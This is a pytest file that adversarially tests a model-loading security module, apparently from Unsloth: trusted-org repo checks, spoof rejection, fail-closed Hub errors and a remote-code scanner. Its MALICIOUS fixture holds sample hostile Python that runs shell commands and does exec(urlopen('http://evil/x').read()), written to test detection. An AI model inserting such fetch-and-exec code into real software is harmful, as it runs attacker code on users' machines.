# SPDX-License-Identifier: AGPL-3.0-only
"""Adversarial verification of Component C (trusted_org + remote_code_scan).

Independent of the implementer's own tests; tries to break the guarantees.
"""
import os
import sys
from pathlib import Path
from unittest.mock import patch, MagicMock

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from utils.security import (
    is_trusted_org_repo,
    scan_remote_code_files,
    remote_code_fingerprint,
    should_block_remote_code,
)
from utils.security import trusted_org as TO


@pytest.fixture(autouse=True)
def _clear():
    TO.clear_cache()
    yield
    TO.clear_cache()


# ---- Item 1: local-path spoof closed --------------------------------------
def test_obvious_local_paths_rejected():
    for n in ["./unsloth/evil", "/tmp/unsloth/x", "~/unsloth/x", ".\\unsloth\\x"]:
        assert is_trusted_org_repo(n, verify_remote=False) is False, n


def test_local_dir_shadowing_trusted_name_rejected(tmp_path, monkeypatch):
    # Attacker creates a local dir literally named "unsloth/evil".
    monkeypatch.chdir(tmp_path)
    (tmp_path / "unsloth" / "evil").mkdir(parents=True)
    TO.clear_cache()
    # Even with remote verify ON, a local path must never reach the Hub check.
    with patch("huggingface_hub.HfApi") as Api:
        assert is_trusted_org_repo("unsloth/evil") is False
        Api.assert_not_called()  # rejected BEFORE any trust decision


def test_untrusted_namespace_rejected():
    for n in ["evil/unsloth-clone", "unsloth-evil/x", "nvidiaa/x", "huggingface/x"]:
        assert is_trusted_org_repo(n, verify_remote=False) is False, n


def test_malformed_names_rejected():
    for n in ["", "unsloth", "a/b/c", "/x", "unsloth/", "/unsloth", None]:
        assert is_trusted_org_repo(n, verify_remote=False) is False, repr(n)


# ---- Item 2: fails closed, never raises -----------------------------------
def test_hub_error_fails_closed():
    for exc in (ConnectionError("net"), Exception("404"), TimeoutError("t")):
        TO.clear_cache()
        with patch("huggingface_hub.HfApi") as Api:
            Api.return_value.model_info.side_effect = exc
            # must return False and NOT raise
            assert is_trusted_org_repo("unsloth/Whatever") is False


def test_hub_resolves_untrusted_owner_rejected():
    info = MagicMock(); info.id = "someoneelse/Whatever"; info.author = "someoneelse"
    with patch("huggingface_hub.HfApi") as Api:
        Api.return_value.model_info.return_value = info
        # name namespace is unsloth/ but the Hub resolves it elsewhere -> reject
        assert is_trusted_org_repo("unsloth/Whatever") is False


def test_genuine_trusted_repo_accepted():
    info = MagicMock(); info.id = "unsloth/Nemotron-H"; info.author = "unsloth"
    with patch("huggingface_hub.HfApi") as Api:
        Api.return_value.model_info.return_value = info
        assert is_trusted_org_repo("unsloth/Nemotron-H") is True


def test_offline_trusts_shape_without_network():
    with patch.dict(os.environ, {"HF_HUB_OFFLINE": "1"}):
        with patch("huggingface_hub.HfApi") as Api:
            assert is_trusted_org_repo("nvidia/Nemotron-H-x") is True
            Api.assert_not_called()  # no network in offline mode


# ---- Item 3: Nemotron gate honors the org check ---------------------------
def test_nemotron_gate_predicate_blocks_spoof():
    # Reproduce the worker gate boolean with the REAL function for a spoof name.
    def gate(name, trc=False):
        low = name.lower()
        subs = ("nemotron_h", "nemotron-h", "nemotron-3-nano")
        return (any(s in low for s in subs)
                and (low.startswith("unsloth/") or low.startswith("nvidia/"))
                and not trc
                and is_trusted_org_repo(name, verify_remote=False))
    # genuine-shape offline -> True (auto-enable fires)
    with patch.dict(os.environ, {"HF_HUB_OFFLINE": "1"}):
        TO.clear_cache()
        assert gate("unsloth/Nemotron-H-8B") is True
    # non-trusted namespace with nemotron substring -> never auto-enables
    TO.clear_cache()
    assert gate("evil/nemotron_h-backdoor") is False


# ---- Item 4: scanner flags malice, benign is clean ------------------------
MALICIOUS = (
    "import os, subprocess, urllib.request, base64\n"
    "subprocess.Popen(['sh','-c','id'])\n"
    "exec(urllib.request.urlopen('http://evil/x').read())\n"
    "__import__('o'+'s').system('whoami')\n"
    "BLOB='" + "A" * 400 + "'\n"
)
BENIGN = (
    "import torch\nfrom torch import nn\n"
    "class FooConfig:\n    def __init__(self, hidden_size=4096):\n        self.hidden_size=hidden_size\n"
    "class FooModel(nn.Module):\n    def forward(self, x):\n        return x + 1\n"
)


def test_scanner_flags_malicious():
    r = scan_remote_code_files({"modeling_x.py": MALICIOUS})
    assert not r.clean
    assert r.max_severity in ("CRITICAL", "HIGH")
    assert should_block_remote_code(r) is True
    # Check names come from the canonical scanner (scripts/scan_packages.py);
    # assert behaviour (flagged), not the exact vendored names.
    assert r.findings


def test_scanner_passes_benign():
    r = scan_remote_code_files({"modeling_x.py": BENIGN})
    assert r.clean is True
    assert should_block_remote_code(r) is False


def test_non_py_ignored():
    r = scan_remote_code_files({"weights.bin": MALICIOUS, "README.md": MALICIOUS})
    assert r.clean is True  # only .py is scanned


def test_fingerprint_stable_and_sensitive():
    a = {"m.py": "x=1\n"}
    b = {"m.py": "x=2\n"}
    assert remote_code_fingerprint(a) == remote_code_fingerprint(dict(a))
    assert remote_code_fingerprint(a) != remote_code_fingerprint(b)


def test_scanner_faithful_to_scan_packages():
    # The vendored scanner should agree with the repo auditor on the malicious file.
    repo_root = Path(__file__).resolve().parents[3]  # unsloth_src
    sp = repo_root / "scripts" / "scan_packages.py"
    if not sp.is_file():
        pytest.skip("scan_packages.py not present")
    import importlib.util
    spec = importlib.util.spec_from_file_location("scan_packages", sp)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    orig = mod.check_py_file(MALICIOUS, "modeling_x.py", "pkg")
    assert len(orig) > 0  # the original auditor also flags it
    ours = scan_remote_code_files({"modeling_x.py": MALICIOUS})
    assert not ours.clean
